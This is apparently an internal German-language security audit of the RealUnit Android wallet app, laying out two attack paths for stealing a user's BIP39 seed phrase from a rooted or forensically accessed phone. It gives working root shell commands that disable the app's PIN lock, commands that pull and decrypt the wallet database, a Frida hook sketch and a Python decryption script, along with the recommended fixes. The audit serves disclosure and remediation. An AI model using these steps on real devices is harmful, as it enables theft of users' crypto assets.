# RealUnit Mobile Wallet — Attack Chain NEW-1 + NEW-4

**Datum:** 2026-05-02
**Repository / Stand:** `DFXswiss/realunit-app` @ `develop` `8e87709`
**Bezug:** Follow-Up-Audit `docs/security-review-followup.md`, Findings NEW-1 und NEW-4
**Klassifikation:** Vertraulich, nur für interne Verwendung

> Dieses Dokument beschreibt den vollständigen Angriffspfad zum permanenten Verlust eines RealUnit-Wallets bei Phone-Diebstahl auf einem rootbaren oder forensisch zugänglichen Android-Gerät. Es dient ausschliesslich dazu, Entscheider und Implementierende zu befähigen, die Schwere und die Reihenfolge der notwendigen Fixes korrekt einzuschätzen. Die beschriebenen Schritte zielen ausschliesslich auf eine **eigene Test-Installation** des Wallets in einer kontrollierten Umgebung (Emulator oder Test-Device). Anwendung gegen fremde Installationen ist illegal.

---

## 1. Threat-Modell

**Angreifer-Profil:**
- Hat physischen Zugriff auf ein Android-Gerät, auf dem die RealUnit-App installiert ist und ein produktives Wallet konfiguriert ist.
- Typische Ausprägungen: Phone-Dieb, gefundene-Geräte-Verwerter, Empfänger eines „verkauften alten Phones" (Wipe wurde nicht zuverlässig durchgeführt), forensisches Lab, Insider mit Zugriff auf das ausgeschaltete Gerät eines Kollegen während der Mittagspause.

**Angreifer-Voraussetzungen — wichtige Einschränkung:**

Damit dieser Angriff praktisch durchführbar ist, muss eine der folgenden Bedingungen erfüllt sein:

- **Das Gerät ist bereits gerootet, bevor der Angreifer es in die Hand bekommt.** Typischerweise Power-User mit Magisk, Custom-ROM oder OEM-Unlocked Bootloader. Userdata bleibt erhalten, App-Datadir ist via `su` lesbar.
- **Der Angreifer hat Zugriff auf forensische Premium-Tools** (Cellebrite UFED, MSAB XRY, Oxygen Forensic Suite, GrayKey für iOS) und kann damit Userdata aus einem ausgeschalteten Gerät extrahieren.
- **Der Angreifer hat physischen Zugriff während die App läuft und nicht im Lockscreen ist** und kann Frida/Debugger anhängen — relevant in Insider-Szenarien.

**Praktisch nicht durchführbar gegen ein Stock-Phone vom Durchschnittsuser:**

Ein normaler User hat ein Phone mit gesperrtem Bootloader, Verified Boot, Hardware-Backed-Keystore. Wenn der Angreifer das Phone gestohlen hat und es vorher nicht rooted war, sind seine Optionen:

- `fastboot oem unlock` zwingt zu einem Userdata-Wipe — die Wallet-Daten werden dabei gelöscht. Der Angriff ist genau gegen die Daten gerichtet, die der Unlock zerstört. Pfad ist tot.
- Cellebrite/Forensik-Bypass funktioniert für ältere Android-Versionen oder spezifische Hardware-Vulnerabilities; auf aktuellen Pixel/Samsung-Knox-Geräten ist das nicht trivial verfügbar und kostet pro Extraktion 4- bis 5-stellige Beträge.
- Andere Hardware-Exploits sind realistisch nur für Strafverfolgung und Nation-State-Akteure.

**Wer ist also realistisch verwundbar:**

- Power-User mit bereits-rooted Phone: voll verwundbar.
- Custom-ROM-User: voll verwundbar.
- User mit OEM-Unlocked Bootloader, der Magisk/etc. installiert hat: voll verwundbar.
- Stock-Phone-User, dessen Phone in einem Forensik-Lab landet (Strafverfolgung, Versicherungs-Schadensregulierung mit Forensik-Auftrag, Reparatur-Werkstatt mit unethischem Personal): bedingt verwundbar, abhängig von der Hardware-Generation und den Tools.
- Stock-Phone-User mit zufällig gestohlenem Phone an einen technisch durchschnittlichen Dieb: weitgehend nicht verwundbar — der Dieb kommt nicht an die Daten ran, ohne sie zu zerstören.

**Angreifer-Wissen, das er nicht hat:**
- Den User-PIN.
- Den User-Biometric-Faktor (Fingerprint, FaceID).
- Die BIP39-Mnemonic-Phrase.

**Angreifer-Ziel:**
- Die BIP39-Mnemonic-Phrase exfiltrieren. Sobald er sie hat, kann er das Wallet auf einem beliebigen anderen Gerät / in einer beliebigen Wallet-Software importieren und alle Tokens transferieren. Der Diebstahl ist permanent — eine BIP39-Phrase kann nicht widerrufen werden, der ursprüngliche User hat dann zwar noch die gleiche Mnemonic, aber alle Werte sind bereits transferiert.

**Was nicht Teil des Threat-Modells ist:**
- Backend-Kompromittierung (das wäre NEW-16).
- MitM zwischen App und DFX-API (das wäre NEW-8).
- Social Engineering gegen den User (Phishing).
- Kompromittierung des User-iCloud/Google-Accounts (separat zu betrachten).

Dieser Angriffsvektor ist **vom DFX-Trust-Modell vollständig unabhängig** — der User vertraut DFX möglicherweise vollständig, das ändert aber nichts daran, dass ein Phone-Verlust auf einem **rootbaren Setup** zur Mnemonic-Exfiltration führen kann.

**Aber:** Der reale Schaden hängt zusätzlich von einem Faktor ab, den dieses Dokument nicht eigenständig prüft (siehe Abschnitt 8): **ob der RealUnit-Token-Smart-Contract Transfer-Restrictions hat** (KYC-Whitelist, übliche Praxis bei tokenisierten Schweizer Wertpapieren). Falls ja, kann der Angreifer die RealUnit-Tokens nicht direkt drainen — der Schaden reduziert sich auf andere ETH-basierte Assets auf derselben Adresse, Privacy-Verlust und Cross-Wallet-Risiko via wiederverwendete Mnemonic.

---

## 2. Architektur-Verständnis

Bevor der Angriff Sinn ergibt, hier die relevanten Speicherorte auf einem Standard-Android-Gerät mit installierter App.

### App-Datadir
```
/data/data/swiss.realunit.app/
```
Dieses Verzeichnis ist im Standardbetrieb nur für den App-eigenen UID lesbar (`run-as swiss.realunit.app` als die App), oder für root.

### Relevante Dateien im Datadir

| Pfad | Inhalt | Sensitivität |
|---|---|---|
| `shared_prefs/FlutterSharedPreferences.xml` | App-Lock-Flags: `isPinEnabled`, `pinFailedAttempts`, `pinLockedUntil`, sonstige App-Settings | **Klartext-XML, manipulierbar** |
| `shared_prefs/FlutterSecureStorage.xml` | Encrypted-Storage: `wallet.mnemonic.encryption.key`, `drift.encryption.password`, `pin.hash`, `pin.salt` | RSA-encrypted, RSA-Key im AndroidKeyStore |
| `app_flutter/wallet.db.enc` | SQLCipher-DB mit Wallet-Info-Tabelle (Spalte `seed` enthält AES-GCM-encrypted BIP39-Mnemonic) | SQLCipher-encrypted |

### Kryptographische Schichten um die Mnemonic

```
BIP39-Mnemonic (Klartext)
        │
        ▼
AES-GCM-Encryption mit Schlüssel aus FlutterSecureStorage["wallet.mnemonic.encryption.key"]
        │
        ▼
gespeichert als TEXT-Spalte `seed` in Tabelle `WalletInfos`
        │
        ▼
SQLCipher-Encryption mit Schlüssel aus FlutterSecureStorage["drift.encryption.password"]
        │
        ▼
DB-File `wallet.db.enc` auf der Disk
```

### App-Lock-Schicht (separat von der Mnemonic-Encryption)

```
User-PIN (6 Digits)
        │
        ▼
PBKDF2-HMAC-SHA256 (10'000 Iterationen, 16-Byte-Salt)
        │
        ▼
gespeichert als `pin.hash` + `pin.salt` in FlutterSecureStorage

Zusätzlich:
isPinEnabled=true/false in FlutterSharedPreferences (Klartext-XML)
pinFailedAttempts (Counter) in FlutterSharedPreferences
pinLockedUntil (DateTime) in FlutterSharedPreferences
```

### Relevante Code-Pfade

- `lib/packages/repository/settings_repository.dart:46-79` — Lockout-Flags in SharedPreferences
- `lib/screens/pin/bloc/auth/pin_auth_cubit.dart:22-30` — App-Lock-Initialisierung
- `lib/main.dart:103-125` — Routing basierend auf PIN-State
- `lib/screens/pin/bloc/setup_pin/setup_pin_cubit.dart:64-72` — PIN-Setup überschreibt alten Hash
- `lib/packages/storage/secure_storage.dart:14, 75-98` — Mnemonic-Encryption-Key-Handling
- `lib/packages/repository/wallet_repository.dart:13, 31-38` — Encrypt/Decrypt-Aufrufe
- `lib/packages/storage/database.dart:75-90` — SQLCipher-Setup mit `pragma key`

---

## 3. Angriffspfad A — App-Lock-Reset (einfach, kein Crypto-Wissen nötig)

Dies ist der Pfad, den ein durchschnittlich technischer Phone-Dieb mit Root-Zugriff durchführen kann, ohne Verständnis von Krypto oder Wallet-Internals.

### Voraussetzung
- adb-Zugriff mit root (`adb shell`, dann `su`), oder Bootloader-Unlock + TWRP.

### Schritt-für-Schritt

**Schritt 1 — Shell-Zugriff**

```bash
adb shell
su
cd /data/data/swiss.realunit.app/shared_prefs/
```

**Schritt 2 — App-Lock-Flag inspizieren**

```bash
cat FlutterSharedPreferences.xml
```

Erwartete Zeile (gekürzt):
```xml
<boolean name="flutter.isPinEnabled" value="true" />
```

(Hinweis: Das `shared_preferences`-Flutter-Plugin prefixt alle Keys mit `flutter.` — der Code-seitige Key `'isPinEnabled'` wird zu `flutter.isPinEnabled` in der XML.)

**Schritt 3 — Flag manipulieren**

```bash
sed -i 's|<boolean name="flutter.isPinEnabled" value="true" />|<boolean name="flutter.isPinEnabled" value="false" />|' FlutterSharedPreferences.xml
```

Optional auch Lockout-Counter zurücksetzen, falls schon Versuche stattgefunden haben:
```bash
sed -i '/flutter.pinFailedAttempts/d; /flutter.pinLockedUntil/d' FlutterSharedPreferences.xml
```

**Schritt 4 — App force-stoppen**

```bash
am force-stop swiss.realunit.app
```

**Schritt 5 — App starten**

Über die UI normal antippen, oder:
```bash
am start -n swiss.realunit.app/.MainActivity
```

Effekt durch den Code-Pfad in `pin_auth_cubit.dart:22-30`:
```dart
final isPinSetup = _settingsRepository.isPinEnabled;  // false aus geänderter XML
emit(state.copyWith(
  isPinSetup: isPinSetup,           // false
  isPinVerified: !isPinSetup,        // true (!)
));
```

In `main.dart:116-117` greift dann:
```dart
} else if (!pinState.isPinSetup) {
  targetRoute = PinRoutes.setup;
}
```

→ Die App routet auf den **PIN-Setup-Screen** statt auf den App-Lock-Verify-Screen. Kein bestehender PIN wird abgefragt.

**Schritt 6 — Neuen PIN setzen**

Auf dem PIN-Setup-Screen wählt der Angreifer einen neuen PIN, z.B. `123456`. `setup_pin_cubit.dart:64-72`:

```dart
Future<void> _confirmPin(String confirmPin) async {
  if (confirmPin == _createPin) {
    final salt = SecureStorage.generatePinSalt();
    final hash = SecureStorage.hashPin(confirmPin, salt);
    await Future.wait([
      _secureStorage.setPinSalt(salt),    // überschreibt original-Salt
      _secureStorage.setPinHash(hash),    // überschreibt original-Hash
    ]);
    _settingsRepository.isPinEnabled = true;
    emit(state.copyWith(isComplete: true));
  }
}
```

→ Der ursprüngliche PIN-Hash wird überschrieben. Der legitime User kann sich nach dem Angriff nicht mehr mit seinem alten PIN einloggen (Denial-of-Service-Nebeneffekt).

**Schritt 7 — App lädt das bestehende Wallet**

Der Wallet-Loading-Code in `wallet_service.dart:39-50` ruft `_repository.getWalletById(id)`, was in `wallet_repository.dart:20-25` den Decrypt-Pfad triggert:

```dart
Future<WalletInfo?> getWalletById(int id) async {
  final info = await _appDatabase.getWalletById(id);
  if (info == null) return null;
  if (info.seed.isEmpty) return info;
  return _decryptWalletInfo(info);     // ← decrypt ohne User-Auth
}
```

`_decryptWalletInfo` ruft `_secureStorage.getOrCreateMnemonicKey()` — dieser Call gibt den AES-Key zurück, **ohne dass eine User-Bestätigung nötig wäre**. Das ist NEW-4.

→ Die App lädt das Original-Wallet vollständig (Original-Mnemonic, Original-Address, Original-Balance) und zeigt es im Dashboard.

**Schritt 8 — Mnemonic anzeigen**

Settings → „Backup Wallet" → Step-up-PIN (mit dem **neu** vom Angreifer gesetzten PIN, weil der Original-Hash überschrieben wurde) → SettingsSeed-Screen zeigt die BIP39-Mnemonic.

`settings_seed_view.dart:21` aktiviert zwar `NoScreenshot.instance.screenshotOff()` (FLAG_SECURE), aber:
- Der Angreifer kann die Worte einfach abschreiben oder mit einer zweiten Kamera abfotografieren.
- FLAG_SECURE schützt nur gegen System-Screenshots, nicht gegen visuelle Erfassung.
- Auf rooted Device kann FLAG_SECURE per Frida-Hook umgangen werden:
  ```bash
  frida -U -l no_flag_secure.js -f swiss.realunit.app
  ```

**Schritt 9 — Mnemonic in Angreifer-Wallet importieren**

In MetaMask, Rabby, Frame, MyEtherWallet — beliebige Wallet-Software, die BIP39 + BIP44-Path `m/44'/60'/0'/0/0` unterstützt.

→ Permanenter Wallet-Zugriff.

**Schritt 10 — Funds transferieren**

- **RealUnit-Tokens:** Transfer hängt davon ab, ob der ERC-20-Contract Transfer-Restrictions hat (KYC-Whitelist auf Smart-Contract-Ebene). Tokenisierte Schweizer Wertpapiere unter dem DLT-Gesetz haben das oft. Wenn restricted → der `transfer()`-Call zu einer nicht-whitelisteten Angreifer-Adresse revertet. Wenn frei handelbar → direkter Drain möglich. **Dieses Dokument hat den Smart-Contract `0x553C7f9C780316FC1D34b8e14ac2465Ab22a090B` nicht eigenständig auf Etherscan verifiziert.**
- **Andere ETH-basierte Assets:** ETH (für Gas-Reserven), beliebige andere ERC-20-Tokens, NFTs auf derselben Adresse — frei transferierbar.
- **Off-Ramp:** Für nicht-restricted Assets via DEX (Uniswap → ETH → CEX-Adresse), kein KYC-Zwang auf DEX-Ebene. Für restricted RealUnit-Tokens nicht möglich.
- **Cross-App-Schaden:** Wenn der User dieselbe BIP39-Mnemonic in anderen Wallets verwendet hat (MetaMask, Rabby, etc.), sind diese ebenfalls kompromittiert.
- **Indirekter Schaden:** Authentifizierung gegenüber DFX-API als der User möglich (NEW-17 persistierte Signatur) — Sell mit ggf. fake-IBAN, falls das Backend keine IBAN-Whitelist gegen KYC-Daten enforce.

**Total Time:**
- Bei vorab-rooted Device: 15-30 Minuten.
- Bei Stock-Phone, das erst gerooted werden muss: praktisch nicht durchführbar, weil Bootloader-Unlock userdata wiped (siehe Threat-Modell-Einschränkung in Abschnitt 1).
- Forensische Premium-Extraktion: Stunden bis Tage, abhängig von Hardware-Generation und Tooling.

---

## 4. Angriffspfad B — Forensische DB-Extraktion (ohne PIN-Reset)

Ein subtilerer Pfad, der den User nicht aussperrt (kein DoS-Nebeneffekt) und damit unauffälliger ist. Nützlich, wenn der Angreifer das Phone wieder zurückgeben will — etwa in einem Reparatur-Lab oder in einer Insider-Situation.

### Voraussetzung
- Root oder forensische Tools.
- Wissen über die Krypto-Pfade (dieses Dokument).

### Schritte

**Schritt 1 — Daten exfiltrieren**

```bash
adb shell
su
cd /data/data/swiss.realunit.app/

# DB-File
cp app_flutter/wallet.db.enc /sdcard/wallet.db.enc

# FlutterSecureStorage XML
cp shared_prefs/FlutterSecureStorage.xml /sdcard/FSS.xml

exit; exit

adb pull /sdcard/wallet.db.enc .
adb pull /sdcard/FSS.xml .
```

**Schritt 2 — FlutterSecureStorage-Werte entschlüsseln**

`FlutterSecureStorage.xml` enthält key-value-Paare, wobei die Values mit dem RSA-Key aus dem AndroidKeyStore verschlüsselt sind. Das Key-Material liegt im Hardware-Keystore und ist non-exportable.

**Aber:** Der Angreifer braucht den Key nicht zu extrahieren. Er kann ihn _verwenden_, sobald er mit Frida-Server (als root) in den App-Prozess injizieren kann. Standard-Forensik-Vorgehen:

1. Frida-Server als root auf dem Device starten (`./frida-server &`).
2. App starten (auch ohne Login bis zum Splash-Screen reicht — der Plugin-Code wird beim ersten FSS-Read geladen).
3. Frida-Skript ausführen, das die FlutterSecureStorage-Plugin-Methoden hookt und Klartext-Reads dumped.

```javascript
// extract_secure_storage.js — schematisch
Java.perform(function() {
  var FSSPlugin = Java.use('com.it_nomads.fluttersecurestorage.FlutterSecureStoragePlugin');
  // Hook die Read-Methode, die nach RSA-Decrypt den Klartext zurückgibt,
  // und logge Key + Klartext-Value.
});
```

Was technisch **nicht** geht: Eine separate Angreifer-App mit eigenem Package-Namen, die unter `run-as` als die RealUnit-App auftritt — `run-as` funktioniert nur für Apps mit `android:debuggable="true"`, das ist bei Production-Builds nicht der Fall. Der Angreifer braucht entweder Root + Frida, oder eine Cellebrite-ähnliche Premium-Forensik-Pipeline.

Ergebnis: Der Angreifer hat im Klartext:
- `wallet.mnemonic.encryption.key` — 32 Bytes Base64
- `drift.encryption.password` — 64 Hex-Chars
- `pin.hash`, `pin.salt` — irrelevant für diesen Pfad

**Schritt 3 — SQLCipher-DB lokal entschlüsseln**

Auf dem Laptop des Angreifers:

```bash
sqlcipher wallet.db.enc
sqlite> PRAGMA cipher_compatibility = 4;
sqlite> PRAGMA key = "<drift.encryption.password>";
sqlite> SELECT name, seed FROM WalletInfos;
```

Ergebnis: Eine Zeile pro Wallet, `seed` ist das AES-GCM-encrypted Mnemonic im Format `<base64-iv>:<base64-ciphertext>`.

**Schritt 4 — Mnemonic entschlüsseln**

Triviales Python-Script mit `cryptography`:

```python
import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

key = base64.b64decode("<wallet.mnemonic.encryption.key>")
iv_b64, ct_b64 = "<seed-from-db>".split(":")
iv = base64.b64decode(iv_b64)
ct = base64.b64decode(ct_b64)

mnemonic = AESGCM(key).decrypt(iv, ct, None).decode("utf-8")
print(mnemonic)
```

→ BIP39-Mnemonic im Klartext.

**Schritt 5+ — Wallet importieren, Funds transferieren**

Wie in Pfad A.

**Vorteil dieses Pfads für den Angreifer:**
- Der User merkt nichts. Sein PIN funktioniert weiterhin, App-Lock ist intakt, Mnemonic-Anzeige im Settings funktioniert. Erst wenn er sein Wallet öffnet und die Balance prüft, sieht er den Verlust.
- Falls die Funds noch nicht transferiert wurden, kann der Angreifer das Phone in Ruhe zurückgeben und später zuschlagen.

---

## 5. Warum keine bestehende Schutzmassnahme greift

| Schutzmassnahme | Wirksamkeit gegen diesen Angriff |
|---|---|
| **PIN (6 Digits)** | Pfad A: Wird neu gesetzt, alter Hash überschrieben. Pfad B: Komplett umgangen. |
| **Biometric (Fingerprint/FaceID)** | `local_auth` gibt nur einen `bool` zurück, ist nicht an den Mnemonic-Key gebunden (NEW-5). Pfad A: Angreifer setzt Biometric ggf. neu. Pfad B: Komplett umgangen. |
| **SQLCipher-DB-Encryption** | Schlüssel liegt in FlutterSecureStorage, ohne User-Auth-Gate verwendbar (NEW-4). |
| **Mnemonic-AES-GCM-Encryption (Audit-Fix für 4.1)** | Schlüssel liegt im selben Trust-Anchor (FlutterSecureStorage), ohne User-Auth-Gate verwendbar. Effektiv kosmetisch. |
| **FLAG_SECURE / NoScreenshot** | Pfad A: Mit Frida-Hook umgehbar; ausserdem visuelle Erfassung möglich. Pfad B: Irrelevant. |
| **`allowBackup="false"` im Manifest** | Schützt vor `adb backup`. Schützt nicht vor direktem Filesystem-Zugriff via Root. |
| **PIN-Lockout (5/6/7/8 min Throttling)** | Counter in SharedPreferences, manipulierbar (NEW-1). Pfad A: Komplett umgangen, weil neuer PIN gesetzt wird. |
| **Step-up-PIN vor Seed-Reveal** | Pfad A: Neuer PIN funktioniert für den Step-up. Pfad B: Komplett umgangen. |
| **Android-Hardware-Backed-Keystore** | Schützt das Key-_Material_ vor Extraktion, aber nicht die Key-_Verwendung_ aus dem App-Sandbox-Kontext. Mit run-as oder Frida nutzt der Angreifer den Schlüssel ohne ihn extrahieren zu müssen. |

**Es gibt keinen verbleibenden kryptographischen Backstop, der den Angreifer aufhält, sobald er Code-Ausführung im App-Sandbox erreicht hat.**

---

## 6. Wie ein NEW-4-Fix den Angriff stoppen würde

Die Empfehlung aus dem Audit (4.1) und aus dem Follow-Up (NEW-4) ist:

**Den Mnemonic-Encryption-Key im Android-Keystore mit `setUserAuthenticationRequired(true)` und `setInvalidatedByBiometricEnrollment(true)` generieren, und Decrypt-Operationen über einen `BiometricPrompt.CryptoObject(cipher)` gaten.**

Effekt auf die beiden Angriffspfade:

### Pfad A nach NEW-4-Fix

Schritt 7 (`getOrCreateMnemonicKey()` ohne Auth) würde fehlschlagen — der Keystore-Key wäre nur nach erfolgreicher Biometric-Authentifizierung verwendbar. Der Angreifer wird mit dem System-BiometricPrompt konfrontiert, der seinen Fingerprint/sein Gesicht abfragt — der ist ihm nicht bekannt. Auch der Geräte-PIN-Fallback ist ihm nicht bekannt (das ist der Lockscreen-PIN, nicht der App-PIN, den er gerade neu gesetzt hat).

→ Wallet-Daten bleiben verschlüsselt im Speicher, App kann nicht ins Dashboard, Mnemonic nicht abrufbar.

### Pfad B nach NEW-4-Fix

In Schritt 4 (lokales Entschlüsseln) würde der Angreifer feststellen, dass der `wallet.mnemonic.encryption.key`-Eintrag in FlutterSecureStorage gar nicht existiert — der Mnemonic-Key liegt direkt im Android-Keystore, nicht in FSS. Um den Key zu nutzen, muss er im App-Kontext laufen UND einen Biometric-Prompt erfolgreich beantworten.

→ Auch ohne Phone-Manipulation und mit kompletter DB-Extraktion bleibt die Mnemonic verschlüsselt.

### Was NEW-4 NICHT alleine löst

- Der Angreifer kommt immer noch in die App rein (NEW-1 ist nicht behoben). Er sieht das Dashboard mit Balance.
- Aber: Ohne Decrypt-Möglichkeit für den Mnemonic kann er die Tokens nicht transferieren (Signing braucht den Mnemonic). Die App müsste bei jedem Transfer den Biometric-Prompt zeigen.
- D.h. der schlimmste Schaden (permanenter Total-Loss via Mnemonic-Exfiltration) ist verhindert. Es bleibt höchstens ein „App-Browse-Access" für den Angreifer — unangenehm, aber nicht finanziell katastrophal.

### Was NEW-1-Fix zusätzlich bringt

Wenn Lockout-State und `isPinEnabled` in SecureStorage liegen statt in SharedPreferences:
- Pfad A Schritt 3 (`isPinEnabled = false`) funktioniert nicht mehr — der Angreifer kann den App-Lock nicht trivial bypassen.
- Er müsste den PIN tatsächlich erraten, was mit korrektem Lockout auf 9 Versuche begrenzt ist.
- **Realistische Erfolgsrate:** Bei mathematisch gleichverteilten 6-Digit-PINs $9/10^6 \approx 0{,}001\%$. Real folgen PINs aber bekannten Mustern (Geburtstag, `123456`, `000000`, `111111`, `654321`, Auto-Sequenzen). Studien zu 4- und 6-Digit-PINs zeigen, dass die Top-10-PINs typischerweise 5–15% aller PINs abdecken. Bei 9 gezielten Versuchen mit Top-PIN-Liste ist die Erfolgsrate also realistisch 5–15% — nicht 0,001%.
- Praktische Konsequenz: NEW-1-Fix macht Pfad A deutlich schwieriger, schliesst ihn aber nicht hermetisch. Eine zusätzliche Massnahme wäre Lockscreen-PIN-Strength-Hinweis bei Wallet-Setup ("verwenden Sie keine Geburtstage / Sequenzen") oder Mindestlängen-Erzwingung > 6 Stellen.

→ Pfad A ist nach NEW-1 deutlich entschärft, aber nicht trivial geschlossen.

### Beide Fixes kombiniert

- Pfad A: Stark entschärft durch NEW-1 (PIN-Bruteforce statt trivialer XML-Edit). Falls PIN ohnehin gut gewählt, faktisch geschlossen.
- Pfad B: Auch nach NEW-4-Fix bleibt der Angreifer im Sandbox-Kontext der App und kann mit Frida den Biometric-Prompt versuchen — aber er hat den Fingerprint des Users nicht, und der Geräte-PIN-Fallback ist der Lockscreen-PIN, den er auch nicht hat.
- Theoretisch offen für Premium-Forensik mit TEE-Bypass (Cellebrite mit aktuellen Exploits, GrayKey, Nation-State-Tooling). Diese Tools sind nicht öffentlich verfügbar und richten sich an Strafverfolgung; relevant für ein Threat-Modell „RealUnit-Holder wird Subjekt einer Strafverfolgungs-Aktion mit forensischer Hardware-Extraktion", aber nicht für „Phone wird in der Bahn gestohlen".
- Hardware-backed Keystore mit User-Auth-Gating ist der industrielle Standard für Banking-Apps in der Schweiz (e.g. UBS, Twint, Swissquote-App) und gilt als ausreichend gegen alle nicht-staatlichen Angreifer.

→ Nach beiden Fixes ist die App auf einem Sicherheitsniveau, das mit etablierten Schweizer Banking-Apps vergleichbar ist.

---

## 7. Praktische Demonstration in einer kontrollierten Umgebung

Zum Verifizieren des Angriffs in einem internen Test-Setup:

### Setup
1. Android-Emulator (Android Studio AVD) mit Android 14, x86_64, Google APIs **NICHT** Google Play (Play-Images blockieren root via Verified Boot).
2. RealUnit-App debug-build installieren oder Beta-APK sideloaden.
3. Wallet erstellen, PIN setzen (z.B. 654321), Mnemonic notieren.
4. Test-Tokens auf der Adresse minten (Sepolia-Testnet, NetworkMode auf Testnet umstellen).

### Pfad A reproduzieren
Schritte aus Abschnitt 3 nachvollziehen.

### Pfad B reproduzieren
Schritte aus Abschnitt 4 nachvollziehen. SQLCipher CLI nötig:
```bash
brew install sqlcipher  # macOS
```

### Erwartetes Ergebnis
In Pfad A: Nach Schritt 8 wird genau die Mnemonic angezeigt, die in Schritt 3 des Setups notiert wurde.
In Pfad B: Nach Schritt 4 entschlüsselt das Python-Script genau diese Mnemonic.

---

## 8. Schadensbewertung — abhängig von ungeprüften Faktoren

Der reale Schaden hängt von mehreren Variablen ab, die in diesem Dokument **nicht eigenständig verifiziert** wurden. Hier wird unterschieden zwischen sicher belegtem Schaden und konditionalem Schaden.

### Sicher belegter Schaden (unabhängig vom Token-Smart-Contract)

- **Mnemonic-Exfiltration** ist der zentrale Angriffspunkt. Sobald die BIP39-Phrase beim Angreifer ist, ist sie permanent kompromittiert — sie kann nicht widerrufen werden.
- **Andere ETH-basierte Assets auf derselben Adresse** (Gas-ETH, andere ERC-20-Tokens, NFTs) sind frei transferierbar und werden gedrained.
- **Cross-Wallet-Risiko:** Wenn der User dieselbe Mnemonic in anderen Wallets verwendet (MetaMask, Rabby, Hardware-Wallet-Backup, etc.), sind diese ebenfalls kompromittiert. Standard-BIP44-Path `m/44'/60'/0'/0/0` macht jede importierende EVM-Wallet zu einem zusätzlichen Schadensvektor.
- **Privacy-Verlust:** KYC-Daten in der DB (sofern dort gespeichert), persistierte Auth-Signatur (NEW-17), Wallet-History.

### Konditionaler Schaden — abhängig vom RealUnit-Token-Smart-Contract

**Der RealUnit-Token-Smart-Contract** auf `0x553C7f9C780316FC1D34b8e14ac2465Ab22a090B` (Ethereum Mainnet) wurde in diesem Dokument **nicht eigenständig auf Etherscan inspiziert**. Tokenisierte Schweizer Wertpapiere unter dem DLT-Gesetz haben üblicherweise eine **Transfer-Restriction** (KYC-Whitelist auf Smart-Contract-Ebene): nur Adressen, die durch den Issuer freigegeben sind, können den Token halten.

| Annahme | Schaden für RealUnit-Holdings |
|---|---|
| Token frei handelbar (kein Whitelist) | Direkter Drain möglich, Off-Ramp via DEX, Total-Loss der RealUnit-Position |
| Token transfer-restricted mit Whitelist | `transfer()` zu Angreifer-Adresse revertet — RealUnit-Holdings bleiben praktisch geschützt; der Angreifer kann sie nicht direkt monetarisieren |

**Action-Item:** Diese Frage muss vor der finalen Risikoeinschätzung intern geklärt werden. Etherscan-Inspektion des Contracts oder Rücksprache mit RealUnit-Token-Issuer.

### Konditionaler Schaden — abhängig vom DFX-Backend-Verhalten

- **IBAN-Whitelist beim Sell:** Wenn DFX-API beim Sell-Confirm eine IBAN gegen eine pro-User-Whitelist (KYC-validierte Bank-Verbindungen des Users) prüft, kann der Angreifer mit dem geklauten Auth-Token nicht einfach an seine eigene IBAN auszahlen.
- **Authentifizierungs-Lifecycle:** Wenn DFX die persistierte Signatur kurzlebig oder mit serverseitigem Nonce-Check entwertet, ist die NEW-17-Vektor-Komponente eingedämmt.

Auch hier: nicht eigenständig geprüft.

### Aggregiert

- Anzahl betroffener User × durchschnittlicher Wallet-Wert.
- Wenn RealUnit-Token-Restrictions greifen: Schaden pro Vorfall begrenzt auf Non-RealUnit-Assets (oft niedrig in einem reinen Wertpapier-Wallet, kann aber bei Multi-Wallet-Usern erheblich sein).
- Wenn nicht: Vollständiger Verlust der RealUnit-Position möglich.

### Reputations-/Compliance-Aspekt

- Ein publizierter Phone-Diebstahl-zu-Drain-Fall in den Schweizer Medien ist für eine FINMA-relevante AG erheblich, **unabhängig** vom konkreten finanziellen Schaden — die Story „App lässt Mnemonic exfiltrieren" reicht für Schaden-Narrativ.
- Ein bekannt werdender systematischer Bug via Reddit/Twitter eines Reverse-Engineers kann zur breiten Welle führen.
- Ein vorhandenes internes Audit-Dokument (dieses hier) hilft bei der Klärung der Frage „war die Schwachstelle bekannt" — sowohl für Schadenersatz als auch für D&O-Versicherung.

---

## 9. Zusammenfassung

**Was technisch belegt ist:**
- Auf einem **bereits-rooted Android-Gerät** kann ein Angreifer mit physischem Zugriff in 15–30 Minuten via SharedPreferences-Edit + neuer PIN den App-Lock bypassen und die Mnemonic via Settings-Seed-Reveal exfiltrieren. Das ist Pfad A.
- Auf einem rooted Gerät mit Frida-Server kann der Angreifer alternativ über DB-Extraktion + In-Process-Hook auf FlutterSecureStorage die Mnemonic exfiltrieren ohne die App-UI zu touchen. Das ist Pfad B.
- Hauptursachen sind NEW-1 (Lockout-State in SharedPreferences) und NEW-4 (Mnemonic-Encryption-Key ohne User-Auth-Gating). Beide sind im aktuellen Code des `develop`-Branches offen.

**Was wichtig zu relativieren ist:**
- Gegen ein **Stock-Phone** mit gesperrtem Bootloader (Default-Auslieferungszustand der meisten Pixel/Samsung/Sony-Geräte) ist Pfad A nicht trivial durchführbar — Bootloader-Unlock zwingt zu Userdata-Wipe, was die zu stehlenden Daten zerstört.
- Realistisch verwundbar sind primär: Power-User mit pre-rooted Devices, Custom-ROM-User, Forensik-Setups in Strafverfolgung/Reparatur-Lab/Versicherungs-Schadensregulierung.
- Der finanzielle Schaden für **RealUnit-Holdings selbst** hängt entscheidend davon ab, ob der Token-Smart-Contract Transfer-Restrictions hat. Diese Frage wurde nicht eigenständig geprüft und sollte vor der finalen Risikoeinschätzung geklärt werden.
- Der Schaden für **Non-RealUnit-Assets auf derselben Adresse** und das **Cross-Wallet-Risiko** durch Mnemonic-Wiederverwendung sind unabhängig vom Token-Contract real.

**Empfohlene Fix-Reihenfolge:**
- NEW-4 zuerst (User-Auth-Gating des Mnemonic-Keys via Android-Keystore-CryptoObject) — eliminiert beide Pfade auf der kryptographischen Ebene, unabhängig davon ob der Angreifer in die App-UI kommt.
- NEW-1 als zweites (Lockout-State in SecureStorage) — eliminiert den App-Lock-Bypass und den DoS-Nebeneffekt für den legitimen User.

**Geschätzter Implementierungsaufwand:** ~7–10 Arbeitstage für 1 Senior Dev inkl. Tests, Migration bestehender Installs und iOS-Plattform-Coverage. Plus externer Re-Audit empfohlen, um die Fixes zu validieren.

**Was dieses Dokument NICHT prüft (Action-Items vor finaler Risikoeinschätzung):**
- Smart-Contract-Inspektion des RealUnit-Tokens auf Etherscan (Transfer-Restrictions, Whitelist-Mechanik).
- DFX-Backend-Verhalten bei Sell mit fake-IBAN (IBAN-Whitelist gegen KYC).
